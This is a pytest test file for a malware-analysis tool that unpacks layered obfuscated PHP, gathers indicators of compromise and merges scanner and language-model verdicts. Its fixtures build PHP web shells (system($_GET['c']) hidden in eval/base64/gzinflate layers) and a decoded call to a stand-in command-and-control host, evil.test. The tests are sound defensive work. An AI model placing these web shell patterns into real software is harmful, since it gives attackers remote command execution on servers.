import base64, json, os, zlib, pytest
from kadath import runes, library, llm

PROMPTS = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "kadath", "prompts")


def _raw_deflate(data):
    co = zlib.compressobj(9, zlib.DEFLATED, -15)
    return co.compress(data) + co.flush()


def test_decoders_are_pure_transforms():
    assert runes.DECODERS["base64_decode"](base64.b64encode(b"hi")) == b"hi"
    assert runes.DECODERS["gzinflate"](_raw_deflate(b"hello")) == b"hello"
    assert runes.DECODERS["gzuncompress"](zlib.compress(b"hello")) == b"hello"
    assert runes.DECODERS["str_rot13"](b"uryyb") == b"hello"
    assert runes.DECODERS["strrev"](b"abc") == b"cba"
    assert runes.DECODERS["hex2bin"](b"68656c6c6f") == b"hello"
    assert runes.DECODERS["urldecode"](b"a%20b") == b"a b"


def test_unpack_nested_layers():
    inner = "<?php system($_GET['c']); // MARK_INNER"
    blob2 = base64.b64encode(inner.encode()).decode()
    layer1 = f"<?php eval(base64_decode('{blob2}'));"
    blob1 = base64.b64encode(_raw_deflate(layer1.encode())).decode()
    source = f"<?php eval(gzinflate(base64_decode('{blob1}')));"
    layers = runes.unpack(source)
    assert [l["n"] for l in layers] == [1, 2]
    assert layers[0]["decoders"] == ["gzinflate", "base64_decode"] and layers[0]["text"] == layer1
    assert layers[1]["decoders"] == ["base64_decode"] and layers[1]["text"] == inner
    assert layers[1]["text"].endswith("MARK_INNER")


def test_unpack_gives_up_on_bad_blob_and_when_unpacked():
    assert runes.unpack("<?php eval(base64_decode('!!!not valid base64 at all!!!####'));") == []
    assert runes.unpack("<?php echo 'plain'; system($_GET['c']);") == []


def test_unpack_respects_layer_cap(monkeypatch):
    monkeypatch.setattr(runes, "LAYER_CAP", 8)
    big = base64.b64encode(b"x" * 4000).decode()
    assert runes.unpack(f"<?php eval(base64_decode('{big}'));") == []


def test_gather_writes_layers_and_harvests_iocs(tmp_path):
    d = tmp_path / "FIO-1"; (d / "kadath").mkdir(parents=True)
    inner = "<?php file_get_contents('http://evil.test/c2'); mail('a@b.co','x','y');"
    blob = base64.b64encode(inner.encode()).decode()
    (d / "s.php").write_text(f"<?php eval(base64_decode('{blob}'));")
    case = library.walk(str(tmp_path))[0]
    layers = runes.unpack(open(case.php).read())
    facts = runes.gather(case.php, layers, str(d / "kadath"))
    assert os.path.isfile(d / "kadath" / "unpacked" / "layer-1.php")
    assert facts["layers"][0]["decoders"] == ["base64_decode"]
    assert "http://evil.test/c2" in facts["indicators"]["urls"]
    assert "a@b.co" in facts["indicators"]["emails"]
    # the base64 blob itself is not a network primitive in the original, but the
    # decoded layer's file_get_contents(url) is
    assert "file_get_contents" in facts["layers"][0]["network"]


class FakeClient:
    model = "cyberqwen"
    profiles = dict(llm.PROFILES)
    def __init__(self, parsed):
        self.parsed, self.calls = parsed, []
    def chat(self, messages, **kw):
        self.calls.append((messages, kw))
        kw["validate"](self.parsed)
        return {"content": json.dumps(self.parsed), "tool_calls": [], "parsed": self.parsed, "messages": messages}


GOOD = {"verdict": "red", "confidence": 0.9, "family": "injector",
        "iocs_extra": [{"type": "url", "value": "http://evil.test/c2", "evidence": "layer1"}],
        "persistence": [], "flows": [{"source": "$_POST", "sink": "eval", "line": 1}], "reason": "packed eval"}


def _case(tmp_path):
    d = tmp_path / "FIO-9"; (d / "kadath").mkdir(parents=True)
    blob = base64.b64encode(b"<?php system($_GET['c']);").decode()
    (d / "s.php").write_text(f"<?php eval(gzinflate(base64_decode('{blob}')));" if False
                             else f"<?php eval(base64_decode('{blob}'));")
    return library.walk(str(tmp_path))[0]


def test_run_floors_at_cavern_and_credits_correctly(tmp_path):
    # model says green, Cavern already said red: red stands, credited to the Cavern
    case = _case(tmp_path)
    out = runes.run(case, {"verdict": "red", "family": "backdoor", "regions": [], "missing_deps": []},
                    FakeClient(dict(GOOD, verdict="green")), PROMPTS)
    assert out["verdict"] == "red" and out["decided_by"] == "cavern" and out["model_verdict"] == "green"
    disk = json.load(open(os.path.join(case.dir, "kadath", "runes.json")))
    assert disk["verdict"] == "red" and disk["layers"][0]["decoders"] == ["base64_decode"]


def test_run_runes_raises_a_green_cavern(tmp_path):
    # Cavern said green, the security model reads the unpacked payload as red:
    # the Runes raise it, and the credit is theirs
    case = _case(tmp_path)
    client = FakeClient(dict(GOOD, verdict="red"))
    out = runes.run(case, {"verdict": "green", "family": "benign", "regions": [], "missing_deps": []},
                    client, PROMPTS)
    assert out["verdict"] == "red" and out["decided_by"] == "runes"
    assert client.calls[0][1]["profile"] == "runes" and client.calls[0][1]["think"] is False


def test_run_passes_fatals_and_merges_iocs(tmp_path):
    case = _case(tmp_path)
    kd = os.path.join(case.dir, "kadath")
    json.dump({"sample": {"filename": "s.php", "sha256": "a" * 64}, "offered_utc": "2026-09-08T00:00:00Z",
               "classification": "wp-sample/webshell", "network": {"observed": False},
               "indicators": [{"type": "wp_user", "value": "x"}]}, open(os.path.join(kd, "iocs.json"), "w"))
    client = FakeClient(GOOD)
    fatal = "[08-Sep-2026 10:00:00 UTC] PHP Fatal error:  Uncaught ValueError: Path cannot be empty in /samples/plugins/x/sample.php:5"
    runes.run(case, {"verdict": "amber", "family": "unknown", "regions": [], "missing_deps": []},
              client, PROMPTS, fatals=[fatal])
    assert "Path cannot be empty" in client.calls[0][0][1]["content"]
    iocs = json.load(open(os.path.join(kd, "iocs.json")))
    vals = {i["value"] for i in iocs["indicators"]}
    assert "http://evil.test/c2" in vals              # from iocs_extra
    assert "x" in vals                                # the pre-existing offering ioc is preserved


def test_schema_rejects_bad_family_and_verdict():
    for bad in (dict(GOOD, family="ransomware"), dict(GOOD, verdict="blue")):
        with pytest.raises(ValueError):
            llm.validate_against(runes.SCHEMA, bad)
    llm.validate_against(runes.SCHEMA, GOOD)
